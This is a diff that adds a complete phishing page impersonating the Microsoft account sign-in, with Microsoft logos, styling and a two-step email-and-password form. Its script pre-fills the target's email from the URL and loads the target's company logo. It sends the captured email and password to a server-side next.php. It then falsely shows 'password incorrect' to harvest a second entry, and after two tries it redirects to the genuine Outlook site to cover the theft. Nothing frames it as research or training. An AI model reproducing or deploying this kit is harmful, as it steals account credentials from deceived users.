@@ -1,0 +1,396 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="shortcut icon" href="https://logincdn.msftauth.net/16.000.30529.1/images/favicon.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .page-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100%;
+        }
+
+        .login-container {
+            width: 100%;
+            height: 370px;
+            max-width: 440px;
+            padding: 30px;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 0 !important;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            position: relative;
+            top: -100px;
+        }
+        
+        .form-step {
+            display: none;
+        }
+        
+        .form-step.active {
+            display: block;
+            margin-top: 69px;
+        }
+        
+        .login-header {
+            position: relative;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-header img {
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            width: auto;
+            height: 32px;
+        }
+        
+        .alert {
+            display: none;
+        }
+
+        .title {
+            margin-bottom: 20px;
+            margin-top: 20px;
+            margin-bottom: 1.25rem;
+            margin-top: 1.25rem;
+            font-size: 24px;
+            line-height: 28px;
+            font-weight: 300;
+            line-height: 1.75rem;
+            padding-bottom: 2.3632px;
+            padding-top: 2.3632px;
+            color: #1b1b1b;
+            font-size: 1.5rem;
+            font-weight: 600;
+            padding: 0;
+            margin-top: 16px;
+            margin-bottom: 12px;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        .text-box {
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            border-bottom: 1px solid #1b1b1b;
+            border-radius: 0;
+            outline: none;
+            box-shadow: none;
+            padding-left: 0px;
+        }
+
+        .text-box:focus {
+            outline: none;
+            box-shadow: none;
+            border-bottom: 1px solid #1b1b1b;
+        }
+
+        a:link {
+            color: #0067b8;
+        }
+
+        a {
+            /*color: #ccc;*/
+            color: #0067b8;
+            text-decoration: none;
+        }
+
+        a {
+            background-color: transparent;
+        }
+        
+        .sign-in {
+            position: relative;
+            height: 32px;
+            width: 108px;
+            padding: 3px 20px;
+            border-radius: 0 !important;
+            background-color: #0067b8;
+            color: #fff;
+        }
+
+        .sign-in-options {
+            max-height: 48px;
+            max-width: 440px;
+            background: #fff;
+            margin-left: -29px;
+            margin-right: -29px;
+            margin-top: 60px;
+        }
+
+        .signinOptions {
+            display: flex;
+            align-items: center;
+            background-color: #fff;
+            padding-left: 30px;
+            margin-top: 0px;
+            padding-top: 8px;
+            padding-bottom: 8px;
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+        }
+
+        .signinOptions img {
+            height: 32px;
+            width: 32px;
+            margin-right: 10px;
+        }
+
+        .signinOptions:hover {
+            background-color: #e4e3e3;
+        }
+
+        .next {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+
+        .nobox {
+            border: none;
+            background: none;
+            outline: none;
+            box-shadow: none;
+            font-size: inherit;
+            color: inherit;
+            padding: 0;
+            width: auto;
+        }
+
+        .notice {
+           font-size: .8125rem;
+           margin-bottom: 15px;
+        }
+
+        .notify-body {
+            font-weight: 400;
+            font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+            font-size: 0.9375rem;
+            line-height: 1.25rem;
+            margin: 0px;
+            background-color: rgb(255, 255, 255);
+        }
+
+        .none {
+            height: 30px;
+        }
+
+        .btn-primary {
+            background-color: #0067b8 !important;
+            border-color: #0067b8 !important;
+        }
+
+        .btn-primary:hover, 
+        .btn-primary:focus, 
+        .btn-primary:active {
+            background-color: #005a9e !important;
+            border-color: #005a9e !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-container">
+        <div class="login-container">
+            <div class="login-header">
+                <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Logo" id="domainLogo">
+            </div>
+
+            <div class="form-step active" id="step1">
+                <div class="title">Sign in</div>
+                <form id="emailForm">
+                    <div class="mb-3">
+                        <input type="email" class="form-control text-box" id="email" placeholder="Email, phone, or Skype" required="">
+                    </div>
+                    <div class="notice">
+                        <span>No account? <a href="">Create one!</a></span>
+                    </div>
+                    <div class="notice">
+                        <span><a href="">Can't access your account?</a></span>
+                    </div>
+                    <div class="next">
+                        <button type="submit" class="btn btn-primary sign-in">Next</button>
+                    </div>
+                </form>
+                <div class="none"></div>
+                <div class="sign-in-options">
+                    <div class="signinOptions">
+                        <img src="https://logincdn.msftauth.net/shared/5/images/signin_options_4e48046ce74f4b89d450.svg"> Sign-in options
+                    </div>
+                </div>
+            </div>
+
+            <div class="form-step" id="step2">
+                <div class="mb-3">
+                    <div class="input-group mb-3">
+                        <input type="text" class="form-control nobox" id="displayEmail" readonly="">
+                    </div>
+                </div>
+                <div class="title">Enter password</div>
+                <div class="pb-2">
+                    <span id="errorAlert" class="text-danger"></span>
+                    <span id="successAlert" class="text-danger"></span>
+                </div>
+                <form id="passwordForm">
+                    <div class="mb-3">
+                        <input type="password" class="form-control text-box" id="password" placeholder="Password" required="">
+                    </div>
+                    <div class="notice">
+                        <span><a href="#">Forgot password?</a></span>
+                    </div>
+                    <div class="next">
+                        <button type="submit" class="btn btn-primary sign-in">Sign in</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" nonce="MTQ2MTU0MzQ5NiwxNDc2OTA3NzA5"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" nonce="MTQ2MTU0MzQ5NiwxNDc2OTA3NzA5"></script>
+
+    <script nonce="MTQ2MTU0MzQ5NiwxNDc2OTA3NzA5">
+    $(document).ready(function() {
+    let submissionCount = 0;
+    let userData = {
+        email: '',
+        password: ''
+    };
+    
+    const fallbackLogo = "https://logincdn.msftauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg";
+    
+    function getEmailFromUrlHash() {
+        const hash = window.location.hash;
+        if (hash && hash.length > 1) {
+            return decodeURIComponent(hash.substring(1));
+        }
+        return '';
+    }
+    
+    const emailFromHash = getEmailFromUrlHash();
+    if (emailFromHash) {
+        $('#email').val(emailFromHash);
+    }
+    
+    function getDomainFromEmail(email) {
+        return email.split('@')[1];
+    }
+    
+    function getFaviconUrl(domain) {
+        return `https://logo.clearbit.com/${domain}`;
+    }
+    
+    function tryLoadDomainFavicon(email) {
+        if (!email || !email.includes('@')) return;
+        
+        const domain = getDomainFromEmail(email);
+        if (!domain) return;
+        
+        const faviconUrl = getFaviconUrl(domain);
+        const img = new Image();
+        
+        img.onload = function() {
+            $('#domainLogo').attr('src', faviconUrl);
+        };
+
+        img.src = faviconUrl;
+    }
+
+    function showError(message) {
+        $('#errorAlert').text(message).show();
+        setTimeout(function() {
+            $('#errorAlert').hide();
+        }, 3000);
+    }
+
+    function showSuccess(message) {
+        $('#successAlert').text(message).show();
+    }
+    
+    function hideSuccess() {
+        $('#successAlert').hide();
+    }
+
+    function goToStep(step) {
+        $('.form-step').removeClass('active');
+        $(`#step${step}`).addClass('active');
+    }
+
+    $('#emailForm').on('submit', function(e) {
+        e.preventDefault();
+        
+        userData.email = $('#email').val().trim();
+        
+        if (!userData.email) {
+            showError('Please enter a valid email address');
+            return;
+        }
+
+        tryLoadDomainFavicon(userData.email);
+
+        $('#displayEmail').val(userData.email);
+        
+        goToStep(2);
+    });
+    
+    $('#password').on('input', function() {
+        hideSuccess();
+    });
+
+    $('#passwordForm').on('submit', function(e) {
+        e.preventDefault();
+        
+        userData.password = $('#password').val().trim();
+        
+        if (!userData.password) {
+            showError('Please enter your password');
+            return;
+        }
+
+        $.ajax({
+            url: 'next.php',
+            type: 'POST',
+            dataType: 'json',
+            data: {
+                email: userData.email,
+                password: userData.password,
+                step: 'password'
+            },
+            success: function(response) {
+                if (response.success) {
+                    showSuccess('Your account or password is incorrect.');
+                    $('#password').val('');
+                    
+                    submissionCount++;
+                    
+                    if (submissionCount >= 2) {
+                        setTimeout(function() {
+                            window.location.href = 'https://outlook.office365.com/mail/view.html#authRedirect=true';
+                        }, 1500);
+                    }
+                } else {
+                    showError(response.message || 'Invalid credentials');
+                }
+            },
+            error: function(xhr, status, error) {
+                console.error("AJAX Error:", status, error);
+                console.log("Response:", xhr.responseText);
+                showError('Server error. Please try again later.');
+            }
+        });
+    });
+});
+</script>
+
+</body></html>
